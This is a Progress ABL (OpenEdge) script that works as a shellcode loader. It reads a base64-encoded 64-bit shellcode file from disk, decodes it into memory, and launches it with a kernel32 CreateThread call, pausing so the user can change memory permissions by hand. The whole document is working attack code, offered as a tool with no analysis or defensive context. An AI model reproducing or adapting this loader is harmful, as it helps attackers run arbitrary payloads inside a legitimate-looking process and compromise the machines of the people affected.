DEFINE VARIABLE b64data AS LONGCHAR NO-UNDO.
DEFINE VARIABLE dwProcessId AS INTEGER NO-UNDO.
DEFINE VARIABLE memptrScData AS MEMPTR NO-UNDO.
DEFINE VARIABLE pScData AS INT64 NO-UNDO.
DEFINE VARIABLE dwScSz AS INT64 NO-UNDO.
DEFINE VARIABLE bSuccess AS INTEGER NO-UNDO.
DEFINE VARIABLE hThread AS INT64 NO-UNDO.
DEFINE VARIABLE dwThreadId AS INTEGER NO-UNDO.

PROCEDURE CreateThread EXTERNAL "kernel32.dll":
    DEFINE INPUT PARAMETER lpThreadAttributes AS INT64.
    DEFINE INPUT PARAMETER dwStackSz AS INT64.
    DEFINE INPUT PARAMETER lpStartAddress AS INT64.
    DEFINE INPUT PARAMETER lpParameter AS INT64.  
    DEFINE INPUT PARAMETER dwCreationFlag AS UNSIGNED-LONG.
    DEFINE INPUT-OUTPUT PARAMETER pdwThreadId AS HANDLE TO UNSIGNED-LONG.
    DEFINE RETURN PARAMETER hThread AS INT64.
END.
PROCEDURE CloseHandle EXTERNAL "kernel32.dll":
    DEFINE INPUT PARAMETER hProcess AS INT64.
    DEFINE RETURN PARAMETER bSuccess AS UNSIGNED-LONG.
END.
PROCEDURE GetCurrentProcessId EXTERNAL "kernel32.dll":            
    DEFINE RETURN PARAMETER dwProcessId AS UNSIGNED-LONG.
END.

ASSIGN dwScSz = 9851990.

COPY-LOB FROM FILE "C:\path\to\shellcode64.txt" TO b64data.
memptrScData = BASE64-DECODE(b64data).
pScData = GET-POINTER-VALUE(memptrScData).

MESSAGE "Decoded sc address: " pScData.

RUN GetCurrentProcessId(OUTPUT dwProcessId).
MESSAGE "Local PID: " dwProcessId.

PAUSE MESSAGE "Press Enter when permission are changed".

RUN CreateThread(INPUT 0, INPUT 0, INPUT pScData, INPUT 0, INPUT 0, INPUT-OUTPUT dwThreadId, OUTPUT hThread).
MESSAGE "Thread handle: " hThread ", TID: " dwThreadId.

RUN CloseHandle(INPUT hThread, OUTPUT bSuccess).
MESSAGE "Result of close: " bSuccess.

PAUSE MESSAGE "Thread is running, you can close this window but don't close the editor...".
